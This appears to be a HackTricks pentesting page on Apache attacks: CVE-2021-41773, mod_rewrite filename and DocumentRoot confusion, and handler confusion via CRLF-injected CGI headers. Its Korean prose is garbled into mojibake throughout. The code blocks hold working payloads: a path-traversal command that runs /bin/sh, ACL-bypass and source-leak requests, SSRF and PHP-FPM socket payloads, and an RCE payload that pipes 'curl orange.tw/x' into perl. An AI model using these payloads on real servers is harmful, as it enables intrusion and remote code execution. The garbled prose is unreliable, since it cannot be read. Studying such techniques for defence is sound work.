# Apache

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## ì‹¤í–‰ ê°€ëŠ¥í•œ PHP í™•ì¥

ì–´ë–¤ í™•ì¥ì´ Apache ì„œë²„ë¥¼ ì‹¤í–‰í•˜ê³  ìˆëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤. ì´ë¥¼ ê²€ìƒ‰í•˜ë ¤ë©´ ë‹¤ìŒì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
ë˜í•œ, ì´ êµ¬ì„±ì„ ì°¾ì„ ìˆ˜ ìˆëŠ” ëª‡ ê°€ì§€ ì¥ì†ŒëŠ”:
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
## CVE-2021-41773

{% code overflow="wrap" %}
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
{% endcode %}

## í˜¼ë€ ê³µê²© <a href="#a-whole-new-attack-confusion-attack" id="a-whole-new-attack-confusion-attack"></a>

ì´ëŸ¬í•œ ìœ í˜•ì˜ ê³µê²©ì€ [**ì˜¤ë Œì§€ì˜ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼ì—ì„œ ì†Œê°œë˜ê³  ë¬¸ì„œí™”ë˜ì—ˆìŠµë‹ˆë‹¤**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1) ê·¸ë¦¬ê³  ë‹¤ìŒì€ ìš”ì•½ì…ë‹ˆë‹¤. "í˜¼ë€" ê³µê²©ì€ ê¸°ë³¸ì ìœ¼ë¡œ Apacheë¥¼ ìƒì„±í•˜ëŠ” ìˆ˜ì‹­ ê°œì˜ ëª¨ë“ˆì´ ì™„ë²½í•˜ê²Œ ë™ê¸°í™”ë˜ì§€ ì•ŠëŠ” ë°©ì‹ì„ ì•…ìš©í•˜ë©°, ì´ë¡œ ì¸í•´ ì¼ë¶€ ëª¨ë“ˆì´ ì˜ˆìƒì¹˜ ëª»í•œ ë°ì´í„°ë¥¼ ìˆ˜ì •í•˜ê²Œ ë˜ë©´ ì´í›„ ëª¨ë“ˆì—ì„œ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### íŒŒì¼ ì´ë¦„ í˜¼ë€

#### ì˜ë¦¼

**`mod_rewrite`**ëŠ” `r->filename`ì˜ ë‚´ìš©ì„ ë¬¸ì `?` ì´í›„ë¡œ ì˜ë¼ëƒ…ë‹ˆë‹¤ ([_**modules/mappers/mod\_rewrite.c#L4141**_](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod\_rewrite.c#L4141)). ì´ëŠ” ëŒ€ë¶€ë¶„ì˜ ëª¨ë“ˆì´ `r->filename`ì„ URLë¡œ ì²˜ë¦¬í•˜ê¸° ë•Œë¬¸ì— ì™„ì „íˆ ì˜ëª»ëœ ê²ƒì€ ì•„ë‹™ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ë‹¤ë¥¸ ê²½ìš°ì—ëŠ” ì´ê²ƒì´ íŒŒì¼ ê²½ë¡œë¡œ ì²˜ë¦¬ë˜ì–´ ë¬¸ì œê°€ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* **ê²½ë¡œ ì˜ë¦¼**

ë‹¤ìŒ ê·œì¹™ ì˜ˆì œì™€ ê°™ì´ `mod_rewrite`ë¥¼ ì•…ìš©í•˜ì—¬ íŒŒì¼ ì‹œìŠ¤í…œ ë‚´ì˜ ë‹¤ë¥¸ íŒŒì¼ì— ì ‘ê·¼í•  ìˆ˜ ìˆìœ¼ë©°, ì˜ˆìƒ ê²½ë¡œì˜ ë§ˆì§€ë§‰ ë¶€ë¶„ì„ ì œê±°í•˜ê³  ë‹¨ìˆœíˆ `?`ë¥¼ ì¶”ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# Expected
curl http://server/user/orange
# the output of file `/var/user/orange/profile.yml`

# Attack
curl http://server/user/orange%2Fsecret.yml%3F
#Â the output of file `/var/user/orange/secret.yml`
```
* **ì˜¤í•´ë¥¼ ì¼ìœ¼í‚¤ëŠ” RewriteFlag í• ë‹¹**

ë‹¤ìŒ ë¦¬ë¼ì´íŠ¸ ê·œì¹™ì—ì„œ URLì´ .phpë¡œ ëë‚˜ëŠ” í•œ, phpë¡œ ì²˜ë¦¬ë˜ê³  ì‹¤í–‰ë©ë‹ˆë‹¤. ë”°ë¼ì„œ `?` ë¬¸ì ë’¤ì— .phpë¡œ ëë‚˜ëŠ” URLì„ ë³´ë‚´ë©´ì„œ ê²½ë¡œì— ì•…ì„± php ì½”ë“œê°€ í¬í•¨ëœ ë‹¤ë¥¸ ìœ í˜•ì˜ íŒŒì¼(ì˜ˆ: ì´ë¯¸ì§€)ì„ ë¡œë“œí•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```bash
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# Attacker uploads a gif file with some php code
curl http://server/upload/1.gif
# GIF89a <?=`id`;>

# Make the server execute the php code
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### **ACL ìš°íšŒ**

ì‚¬ìš©ìê°€ ì ‘ê·¼í•  ìˆ˜ ì—†ì–´ì•¼ í•˜ëŠ” íŒŒì¼ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥ì„±ì´ ìˆìœ¼ë©°, ì ‘ê·¼ì´ ê±°ë¶€ë˜ì–´ì•¼ í•˜ëŠ” êµ¬ì„±ì—ì„œë„ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```xml
<Files "admin.php">
AuthType Basic
AuthName "Admin Panel"
AuthUserFile "/etc/apache2/.htpasswd"
Require valid-user
</Files>
```
ì´ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ PHP-FPMì´ `.php`ë¡œ ëë‚˜ëŠ” URLì„ ìˆ˜ì‹ í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ `http://server/admin.php%3Fooo.php`ì™€ ê°™ì´, PHP-FPMì€ `?` ë¬¸ì ì´í›„ì˜ ëª¨ë“  ê²ƒì„ ì œê±°í•˜ë¯€ë¡œ, ì´ì „ ê·œì¹™ì´ ì´ë¥¼ ê¸ˆì§€í–ˆë”ë¼ë„ `/admin.php`ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.

### DocumentRoot Confusion
```bash
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```
Apacheì— ëŒ€í•œ ì¬ë¯¸ìˆëŠ” ì‚¬ì‹¤ì€ ì´ì „ì˜ ì¬ì‘ì„± ê³¼ì •ì´ documentRootì™€ rootì—ì„œ íŒŒì¼ì— ì ‘ê·¼í•˜ë ¤ê³  ì‹œë„í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ `https://server/abouth.html`ì— ëŒ€í•œ ìš”ì²­ì€ íŒŒì¼ ì‹œìŠ¤í…œì—ì„œ `/var/www/html/about.html`ê³¼ `/about.html`ì—ì„œ íŒŒì¼ì„ í™•ì¸í•©ë‹ˆë‹¤. ì´ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ íŒŒì¼ ì‹œìŠ¤í…œì˜ íŒŒì¼ì— ì ‘ê·¼í•˜ëŠ” ë° ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### **ì„œë²„ ì¸¡ ì†ŒìŠ¤ ì½”ë“œ ë…¸ì¶œ**

* **CGI ì†ŒìŠ¤ ì½”ë“œ ë…¸ì¶œ**

ëì— %3Fë¥¼ ì¶”ê°€í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œë„ cgi ëª¨ë“ˆì˜ ì†ŒìŠ¤ ì½”ë“œë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
```
* **PHP ì†ŒìŠ¤ ì½”ë“œ ë…¸ì¶œ**

ì„œë²„ì— ì—¬ëŸ¬ ë„ë©”ì¸ì´ ìˆê³  ê·¸ ì¤‘ í•˜ë‚˜ê°€ ì •ì  ë„ë©”ì¸ì¸ ê²½ìš°, ì´ë¥¼ ì•…ìš©í•˜ì—¬ íŒŒì¼ ì‹œìŠ¤í…œì„ íƒìƒ‰í•˜ê³  php ì½”ë“œë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
# Leak the config.php file of the www.local domain from the static.local domain
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
```
#### **ë¡œì»¬ ê°€ì ¯ ì¡°ì‘**

ì´ì „ ê³µê²©ì˜ ì£¼ìš” ë¬¸ì œëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ëŒ€ë¶€ë¶„ì˜ íŒŒì¼ ì‹œìŠ¤í…œì— ëŒ€í•œ ì ‘ê·¼ì´ ê±°ë¶€ëœë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ëŠ” Apache HTTP Serverì˜ [êµ¬ì„± í…œí”Œë¦¿](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```xml
<Directory />
AllowOverride None
Require all denied
</Directory>
```
ê·¸ëŸ¬ë‚˜ [Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165) ìš´ì˜ ì²´ì œëŠ” ê¸°ë³¸ì ìœ¼ë¡œ `/usr/share`ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤:
```xml
<Directory /usr/share>
AllowOverride None
Require all granted
</Directory>
```
ë”°ë¼ì„œ ì´ëŸ¬í•œ ë°°í¬íŒì—ì„œ `/usr/share` ë‚´ë¶€ì— ìœ„ì¹˜í•œ íŒŒì¼ì„ **ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

**ì •ë³´ ìœ ì¶œì„ ìœ„í•œ ë¡œì»¬ ê°€ì ¯**

* **websocketd**ê°€ í¬í•¨ëœ **Apache HTTP Server**ëŠ” **/usr/share/doc/websocketd/examples/php/**ì— ìˆëŠ” **dump-env.php** ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë…¸ì¶œì‹œì¼œ ë¯¼ê°í•œ í™˜ê²½ ë³€ìˆ˜ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Nginx** ë˜ëŠ” **Jetty**ê°€ ìˆëŠ” ì„œë²„ëŠ” ê¸°ë³¸ ì›¹ ë£¨íŠ¸ ì•„ë˜ì— ìœ„ì¹˜í•œ ë¯¼ê°í•œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ì •ë³´ë¥¼ ë…¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì˜ˆ: **web.xml**):
* **/usr/share/nginx/html/**
* **/usr/share/jetty9/etc/**
* **/usr/share/jetty9/webapps/**

**XSSë¥¼ ìœ„í•œ ë¡œì»¬ ê°€ì ¯**

* **LibreOfficeê°€ ì„¤ì¹˜ëœ** Ubuntu Desktopì—ì„œ ë„ì›€ë§ íŒŒì¼ì˜ ì–¸ì–´ ì „í™˜ ê¸°ëŠ¥ì„ ì•…ìš©í•˜ë©´ **êµì°¨ ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ… (XSS)**ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **/usr/share/libreoffice/help/help.html**ì—ì„œ URLì„ ì¡°ì‘í•˜ë©´ ì•…ì„± í˜ì´ì§€ë‚˜ ì´ì „ ë²„ì „ìœ¼ë¡œ ë¦¬ë””ë ‰ì…˜ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤ **unsafe RewriteRule**ì„ í†µí•´.

**LFIë¥¼ ìœ„í•œ ë¡œì»¬ ê°€ì ¯**

* PHP ë˜ëŠ” **JpGraph** ë˜ëŠ” **jQuery-jFeed**ì™€ ê°™ì€ íŠ¹ì • í”„ë¡ íŠ¸ì—”ë“œ íŒ¨í‚¤ì§€ê°€ ì„¤ì¹˜ëœ ê²½ìš°, ì´ë“¤ì˜ íŒŒì¼ì„ ì•…ìš©í•˜ì—¬ **/etc/passwd**ì™€ ê°™ì€ ë¯¼ê°í•œ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
* **/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php**
* **/usr/share/javascript/jquery-jfeed/proxy.php**
* **/usr/share/moodle/mod/assignment/type/wims/getcsv.php**

**SSRFë¥¼ ìœ„í•œ ë¡œì»¬ ê°€ì ¯**

* **MagpieRSSì˜ magpie\_debug.php**ë¥¼ **/usr/share/php/magpierss/scripts/magpie\_debug.php**ì—ì„œ í™œìš©í•˜ë©´ SSRF ì·¨ì•½ì ì„ ì‰½ê²Œ ìƒì„±í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ì¶”ê°€ì ì¸ ê³µê²©ì„ ìœ„í•œ ê²Œì´íŠ¸ì›¨ì´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

**RCEë¥¼ ìœ„í•œ ë¡œì»¬ ê°€ì ¯**

* **ì›ê²© ì½”ë“œ ì‹¤í–‰ (RCE)**ì˜ ê¸°íšŒëŠ” ë°©ëŒ€í•˜ë©°, ì·¨ì•½í•œ ì„¤ì¹˜(ì˜ˆ: êµ¬ì‹ **PHPUnit** ë˜ëŠ” **phpLiteAdmin**)ê°€ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ê²ƒë“¤ì€ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë° ì•…ìš©ë  ìˆ˜ ìˆìœ¼ë©°, ë¡œì»¬ ê°€ì ¯ ì¡°ì‘ì˜ ê´‘ë²”ìœ„í•œ ì ì¬ë ¥ì„ ë³´ì—¬ì¤ë‹ˆë‹¤.

#### **ë¡œì»¬ ê°€ì ¯ì—ì„œì˜ íƒˆì˜¥**

ì„¤ì¹˜ëœ ì†Œí”„íŠ¸ì›¨ì–´ê°€ ìƒì„±í•œ ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ë”°ë¼ í—ˆìš©ëœ í´ë”ì—ì„œ íƒˆì˜¥í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:

* **Cacti Log**: `/usr/share/cacti/site/` -> `/var/log/cacti/`
* **Solr Data**: `/usr/share/solr/data/` -> `/var/lib/solr/data`
* **Solr Config**: `/usr/share/solr/conf/` -> `/etc/solr/conf/`
* **MediaWiki Config**: `/usr/share/mediawiki/config/` -> `/var/lib/mediawiki/config/`
* **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` -> `/etc/simplesamlphp/`

ë˜í•œ, ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ì•…ìš©í•˜ì—¬ **Redmineì—ì„œ RCEë¥¼ ì–»ëŠ” ê²ƒì´ ê°€ëŠ¥í–ˆìŠµë‹ˆë‹¤.**

### í•¸ë“¤ëŸ¬ í˜¼ë€ <a href="#id-3-handler-confusion" id="id-3-handler-confusion"></a>

ì´ ê³µê²©ì€ `AddHandler`ì™€ `AddType` ì§€ì‹œì–´ ê°„ì˜ ê¸°ëŠ¥ ì¤‘ë³µì„ ì•…ìš©í•˜ë©°, ë‘ ì§€ì‹œì–´ ëª¨ë‘ **PHP ì²˜ë¦¬ë¥¼ í™œì„±í™”**í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì›ë˜ ì´ ì§€ì‹œì–´ë“¤ì€ ì„œë²„ì˜ ë‚´ë¶€ êµ¬ì¡°ì—ì„œ ì„œë¡œ ë‹¤ë¥¸ í•„ë“œ(`r->handler` ë° `r->content_type`)ì— ì˜í–¥ì„ ë¯¸ì³¤ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ë ˆê±°ì‹œ ì½”ë“œë¡œ ì¸í•´ ApacheëŠ” íŠ¹ì • ì¡°ê±´ì—ì„œ ì´ ì§€ì‹œì–´ë“¤ì„ ì„œë¡œ êµí™˜í•˜ì—¬ ì²˜ë¦¬í•˜ë©°, ì´ì „ì´ ì„¤ì •ë˜ê³  í›„ìê°€ ì„¤ì •ë˜ì§€ ì•Šì€ ê²½ìš° `r->content_type`ì„ `r->handler`ë¡œ ë³€í™˜í•©ë‹ˆë‹¤.

ë˜í•œ, Apache HTTP Server(`server/config.c#L420`)ì—ì„œ `ap_run_handler()`ë¥¼ ì‹¤í–‰í•˜ê¸° ì „ì— `r->handler`ê°€ ë¹„ì–´ ìˆìœ¼ë©´ ì„œë²„ëŠ” **`r->content_type`ì„ í•¸ë“¤ëŸ¬ë¡œ ì‚¬ìš©í•©ë‹ˆë‹¤**, íš¨ê³¼ì ìœ¼ë¡œ `AddType`ê³¼ `AddHandler`ë¥¼ ë™ì¼í•˜ê²Œ ë§Œë“­ë‹ˆë‹¤.

#### **PHP ì†ŒìŠ¤ ì½”ë“œ ìœ ì¶œì„ ìœ„í•œ í•¸ë“¤ëŸ¬ ë®ì–´ì“°ê¸°**

[**ì´ ë°œí‘œ**](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013\_dmitriev-maksim.pdf)ì—ì„œëŠ” í´ë¼ì´ì–¸íŠ¸ê°€ ë³´ë‚¸ ì˜ëª»ëœ `Content-Length`ê°€ Apacheê°€ ì‹¤ìˆ˜ë¡œ **PHP ì†ŒìŠ¤ ì½”ë“œë¥¼ ë°˜í™˜**í•˜ê²Œ ë§Œë“œëŠ” ì·¨ì•½ì ì´ ì†Œê°œë˜ì—ˆìŠµë‹ˆë‹¤. ì´ëŠ” ModSecurityì™€ Apache Portable Runtime (APR)ì—ì„œì˜ ì˜¤ë¥˜ ì²˜ë¦¬ ë¬¸ì œë¡œ ì¸í•´ ë°œìƒí–ˆìœ¼ë©°, ì´ì¤‘ ì‘ë‹µì´ `r->content_type`ì„ `text/html`ë¡œ ë®ì–´ì“°ê²Œ ë©ë‹ˆë‹¤.\
ModSecurityê°€ ë°˜í™˜ ê°’ì„ ì œëŒ€ë¡œ ì²˜ë¦¬í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— PHP ì½”ë“œë¥¼ ë°˜í™˜í•˜ê³  í•´ì„í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

#### **XXXXë¥¼ ìœ„í•œ í•¸ë“¤ëŸ¬ ë®ì–´ì“°ê¸°**

TODO: OrangeëŠ” ì•„ì§ ì´ ì·¨ì•½ì ì„ ê³µê°œí•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.

### **ì„ì˜ í•¸ë“¤ëŸ¬ í˜¸ì¶œ**

ê³µê²©ìê°€ ì„œë²„ ì‘ë‹µì—ì„œ **`Content-Type`** í—¤ë”ë¥¼ ì œì–´í•  ìˆ˜ ìˆë‹¤ë©´ **ì„ì˜ ëª¨ë“ˆ í•¸ë“¤ëŸ¬ë¥¼ í˜¸ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ê³µê²©ìê°€ ì´ë¥¼ ì œì–´í•˜ëŠ” ì‹œì ì—ì„œ ìš”ì²­ì˜ ëŒ€ë¶€ë¶„ì˜ ê³¼ì •ì€ ì´ë¯¸ ì™„ë£Œë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **`Location` í—¤ë”ë¥¼ ì•…ìš©í•˜ì—¬ ìš”ì²­ í”„ë¡œì„¸ìŠ¤ë¥¼ ì¬ì‹œì‘í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤**. ì™œëƒí•˜ë©´ **r**eturned `Status`ê°€ 200ì´ê³  `Location` í—¤ë”ê°€ `/`ë¡œ ì‹œì‘í•˜ë©´ ì‘ë‹µì´ ì„œë²„ ì¸¡ ë¦¬ë””ë ‰ì…˜ìœ¼ë¡œ ì²˜ë¦¬ë˜ì–´ì•¼ í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

[**RFC 3875**](https://datatracker.ietf.org/doc/html/rfc3875) (CGIì— ëŒ€í•œ ëª…ì„¸)ì—ì„œ [ì„¹ì…˜ 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2)ëŠ” ë¡œì»¬ ë¦¬ë””ë ‰ì…˜ ì‘ë‹µ ë™ì‘ì„ ì •ì˜í•©ë‹ˆë‹¤:

> CGI ìŠ¤í¬ë¦½íŠ¸ëŠ” ë¡œì»¬ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ URI ê²½ë¡œì™€ ì¿¼ë¦¬ ë¬¸ìì—´(â€˜local-pathqueryâ€™)ì„ Location í—¤ë” í•„ë“œì— ë°˜í™˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ì„œë²„ì— ì§€ì •ëœ ê²½ë¡œë¥¼ ì‚¬ìš©í•˜ì—¬ ìš”ì²­ì„ ì¬ì²˜ë¦¬í•´ì•¼ í•¨ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

ë”°ë¼ì„œ ì´ ê³µê²©ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„œëŠ” ë‹¤ìŒ ì¤‘ í•˜ë‚˜ì˜ ì·¨ì•½ì ì´ í•„ìš”í•©ë‹ˆë‹¤:

* CGI ì‘ë‹µ í—¤ë”ì—ì„œ CRLF ì£¼ì…
* ì‘ë‹µ í—¤ë”ì— ëŒ€í•œ ì™„ì „í•œ ì œì–´ê°€ ìˆëŠ” SSRF

#### **ì •ë³´ ìœ ì¶œì„ ìœ„í•œ ì„ì˜ í•¸ë“¤ëŸ¬**

ì˜ˆë¥¼ ë“¤ì–´ `/server-status`ëŠ” ë¡œì»¬ì—ì„œë§Œ ì ‘ê·¼ ê°€ëŠ¥í•´ì•¼ í•©ë‹ˆë‹¤:
```xml
<Location /server-status>
SetHandler server-status
Require local
</Location>
```
`Content-Type`ë¥¼ `server-status`ë¡œ ì„¤ì •í•˜ê³  Location í—¤ë”ë¥¼ `/`ë¡œ ì‹œì‘í•˜ë„ë¡ ì„¤ì •í•˜ë©´ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```
#### **ì„ì˜ í•¸ë“¤ëŸ¬ë¥¼ í†µí•œ ì „ì²´ SSRF**

`mod_proxy`ë¡œ ë¦¬ë””ë ‰ì…˜í•˜ì—¬ ëª¨ë“  URLì˜ ëª¨ë“  í”„ë¡œí† ì½œì— ì ‘ê·¼:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
%0d%0a
%0d%0a
```
ê·¸ëŸ¬ë‚˜ `X-Forwarded-For` í—¤ë”ê°€ ì¶”ê°€ë˜ì–´ í´ë¼ìš°ë“œ ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸ì— ëŒ€í•œ ì ‘ê·¼ì„ ì°¨ë‹¨í•©ë‹ˆë‹¤.

#### **ë¡œì»¬ ìœ ë‹‰ìŠ¤ ë„ë©”ì¸ ì†Œì¼“ì— ì ‘ê·¼í•˜ê¸° ìœ„í•œ ì„ì˜ í•¸ë“¤ëŸ¬**

PHP-FPMì˜ ë¡œì»¬ ìœ ë‹‰ìŠ¤ ë„ë©”ì¸ ì†Œì¼“ì— ì ‘ê·¼í•˜ì—¬ `/tmp/`ì— ìœ„ì¹˜í•œ PHP ë°±ë„ì–´ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
```
#### **ì„ì˜ í•¸ë“¤ëŸ¬ë¥¼ í†µí•œ RCE**

ê³µì‹ [PHP Docker](https://hub.docker.com/\_/php) ì´ë¯¸ì§€ì—ëŠ” PEAR(`Pearcmd.php`)ê°€ í¬í•¨ë˜ì–´ ìˆìœ¼ë©°, ì´ëŠ” RCEë¥¼ ì–»ê¸° ìœ„í•´ ì•…ìš©ë  ìˆ˜ ìˆëŠ” ëª…ë ¹ì¤„ PHP íŒ¨í‚¤ì§€ ê´€ë¦¬ ë„êµ¬ì…ë‹ˆë‹¤:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
Check [**Docker PHP LFI Summary**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), written by [Phith0n](https://x.com/phithon\_xg) for the details of this technique.

## References

* [https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
